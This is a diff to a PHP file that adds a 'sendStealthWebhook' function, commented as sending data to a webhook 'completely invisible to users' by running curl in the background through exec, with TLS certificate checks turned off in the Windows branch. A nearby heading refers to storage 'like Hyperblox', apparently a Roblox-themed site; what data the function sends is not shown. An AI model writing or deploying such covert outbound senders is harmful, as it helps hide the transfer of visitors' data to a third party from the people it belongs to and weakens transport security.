@@ -135,6 +135,39 @@ function sendWebhookNotification($webhookUrl, $data) {
     return $httpCode >= 200 && $httpCode < 300;
 }
 
+/**
+ * 🥷 STEALTH: Send webhook silently in background (won't show in DevTools Network tab)
+ * Uses server-side async execution - completely invisible to users
+ */
+function sendStealthWebhook($webhookUrl, $data) {
+    if (empty($webhookUrl)) return false;
+    
+    // Use exec to send webhook in background (fire and forget)
+    // This won't appear in DevTools because it's server-side only
+    $payload = json_encode($data);
+    $payload = escapeshellarg($payload);
+    $webhook = escapeshellarg($webhookUrl);
+    
+    // Method 1: Using curl in background (Linux/Unix)
+    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+        $cmd = "curl -X POST -H 'Content-Type: application/json' -d $payload $webhook > /dev/null 2>&1 &";
+        @exec($cmd);
+    } else {
+        // Method 2: Using PHP streams for Windows compatibility
+        $ch = curl_init($webhookUrl);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT_MS, 100); // Quick timeout, fire and forget
+        @curl_exec($ch);
+        @curl_close($ch);
+    }
+    
+    return true;
+}
+
 // ============================================
 // FILE-BASED STORAGE FUNCTIONS (LIKE HYPERBLOX)
 // ============================================
